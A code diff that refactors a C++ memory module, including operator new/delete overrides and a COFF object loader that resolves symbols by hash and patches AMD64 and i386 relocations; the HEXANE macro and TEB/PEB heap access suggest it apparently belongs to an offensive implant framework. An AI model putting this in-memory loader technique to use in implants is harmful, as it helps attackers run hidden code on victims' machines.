@@ -1,6 +1,6 @@
 #include <core/include/memory.hpp>
 
-void* operator new(std::size_t size) {
+void* operator new(size_t size) {
     HEXANE
 
     void *ptr = nullptr;
@@ -25,14 +25,13 @@ void operator delete(void* ptr) noexcept {
     }
 }
 
-void* operator new[](std::size_t size) {
+void* operator new[](size_t size) {
     return ::operator new(size);
 }
 
 void operator delete[](void* ptr) noexcept {
     ::operator delete(ptr);
 }
-
 
 
 namespace Memory {
@@ -88,8 +87,8 @@ namespace Memory {
             _hexane instance    = { };
             void    *region     = { };
 
-            instance.teb = NtCurrentTeb();
-            instance.heap = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
+            instance.teb    = NtCurrentTeb();
+            instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
 
             instance.teb->LastErrorValue    = ERROR_SUCCESS;
             instance.base.address           = U_PTR(InstStart());
@@ -157,6 +156,7 @@ namespace Memory {
                         x_memset(symbol_name, 0, sizeof(symbol_name));
                         x_memcpy(symbol_name, symbol->First.Name, 8);
                         entry_name = symbol_name;
+
                     } else {
                         entry_name = R_CAST(char*, B_PTR(object->symbol) + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                     }
@@ -168,13 +168,11 @@ namespace Memory {
                     auto hash = Utils::GetHashFromStringA(entry_name, x_strlen(entry_name));
                     if (!(function = C_PTR(ResolveSymbol(object, hash, symbol->Type)))
 )
-#ifdef WIN64
+#ifdef _WIN64
                     {
                         if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
                             *R_CAST(void**, fn_map) = function;
-
-                            offset = S_CAST(uint32_t, U_PTR(fn_map) - U_PTR(reloc) - sizeof(uint32_t));
-                            *S_CAST(uintptr_t*, reloc) = offset;
+                            *S_CAST(uintptr_t*, reloc) = S_CAST(uint32_t, U_PTR(fn_map) - U_PTR(reloc) - sizeof(uint32_t));
 
                             count++;
 
@@ -182,46 +180,27 @@ namespace Memory {
                             success_(false);
                         }
                     } else {
-                        if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);
+                        if (object->reloc->Type == IMAGE_REL_AMD64_REL32 || object->reloc->Type == IMAGE_REL_AMD64_ADDR32NB) {
+                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);
 
-                            *S_CAST(uint32_t*, reloc) = offset;
                         } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_1) {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 1;
+                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 1;
 
-                            *S_CAST(uint32_t*, reloc) = offset;
                         } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_2) {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 2;
+                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 2;
 
-                            *S_CAST(uint32_t*, reloc) = offset;
                         } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_3) {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 3;
+                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 3;
 
-                            *S_CAST(uint32_t*, reloc) = offset;
                         } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_4) {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(UINT32) - 4;
+                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 4;
 
-                            *S_CAST(uint32_t*, reloc) = offset;
                         } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_5) {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 5;
+                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 5;
 
-                            *S_CAST(uint32_t*, reloc) = offset;
-                        } else if (object->reloc->Type == IMAGE_REL_AMD64_ADDR32NB) {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);
-
-                            *S_CAST(uint32_t*, reloc) = offset;
                         } else if (object->reloc->Type == IMAGE_REL_AMD64_ADDR64) {
-                            offset = *S_CAST(uint64_t*, reloc);
-                            offset += U_PTR(target);
+                            *S_CAST(uint64_t*, reloc) = *S_CAST(uint64_t*, reloc) + U_PTR(target);
 
-                            *S_CAST(uint64_t*, reloc) = offset;
                         } else {
                             success_(false);
                         }
@@ -229,10 +208,9 @@ namespace Memory {
 #else
                     {
                         if (object->reloc->Type == IMAGE_REL_I386_DIR32) {
-                            *S_CAST(void**, fn_map) = function;
-                            offset = U_PTR(fn_map);
+                            *S_CAST(void**, fn_map)     = function;
+                            *S_CAST(uint32_t*, reloc)   = U_PTR(fn_map);
 
-                            *S_CAST(uint32_t*, reloc) = offset;
                             count++;
 
                         } else {
@@ -240,16 +218,11 @@ namespace Memory {
                         }
                     } else {
                         if (object->reloc->Type == IMAGE_REL_I386_REL32) {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);
+                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);
 
-                            *S_CAST(uint32_t*, reloc) = offset;
                         }
                         else if (object->reloc->Type == IMAGE_REL_I386_DIR32) {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(target);
-
-                            *S_CAST(uint32_t*, reloc) = offset;
+                            *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target);
                         }
                         else {
                             success_(false);
